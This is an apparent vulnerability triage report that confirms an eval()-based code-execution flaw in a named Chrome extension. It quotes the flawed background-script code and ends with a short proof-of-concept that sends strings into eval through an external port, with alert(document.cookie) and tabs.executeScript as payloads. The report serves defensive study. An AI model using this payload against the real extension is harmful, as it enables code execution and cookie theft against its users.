# CoCo Analysis: nkogdbkblmkcnolnafcddkigkebgcgop

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
CoCo detected taint from `bg_external_port_onMessage` to `eval_sink` but did not provide specific line numbers in the trace output.

**Code:**

```javascript
// Background script - bg.js (Lines 973-1074)

// Handler for messages from external connections
function onWebMessage(id, ext2helper) {
   return function(message) {
      var obj = eval(message); // ← EVAL SINK - attacker-controlled message
      var cmd = obj.cmd;
      var port = obj.port;
      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);
      if (cmd === 'e_play') {
         if (multi) {
            ++plays;
            try { appPorts[id].web.postMessage({type: 'e_play_success'}); } catch (e) { console.log(e); }
            console.log('GET PLAY: ID = ' + id + ', Ack = ' + ackCount + ', Multi = ' + multi + ', plays = ' + plays);
         }
         // ... additional command handling
      }
      else if (cmd === 'e_stop_success') {
         // ... handler code
      }
      else {
         try { ext2helper.postMessage(obj); } catch (e) { console.log(e); }
      }
   }
}

// Handler for messages from native app
function onNativeMessage(id, ext2web) {
   return function(message) {
      var obj = eval(message); // ← Another EVAL SINK
      var port = obj.port;
      var brandVersion = obj.brandVersion;
      console.log('ID = ' + id + ' get port = ' + port + ' get brand version = ' + brandVersion);
      obj.type = 'message';
      try { ext2web.postMessage(obj); } catch (e) { console.log(e); }
   }
}

// Entry point - External connections accepted
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect; // ← Attacker can establish external connection
   appPorts[++count] = { web: Ext2Web };
   var Ext2Helper = chrome.runtime.connectNative("es.ionplayer.chrome.plugin.helper");
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← Messages flow to eval
   Ext2Web.onDisconnect.addListener(onDisconnectedFromWeb(count, Ext2Helper));
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External port connection (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From a whitelisted website or another extension
var port = chrome.runtime.connect("nkogdbkblmkcnolnafcddkigkebgcgop");

// Send malicious code to be evaluated
port.postMessage('({cmd: "malicious", exploit: alert(document.cookie)})');

// Or execute arbitrary code
port.postMessage('(function(){chrome.tabs.executeScript(null, {code: "alert(1)"})})()');
```

**Impact:** Arbitrary code execution in the extension's background context. An attacker from a whitelisted domain (ionplayer.es, perseo.tv, or localhost) can send messages that are directly evaluated using `eval()`, allowing execution of arbitrary JavaScript code with the extension's privileges (nativeMessaging, background permissions).
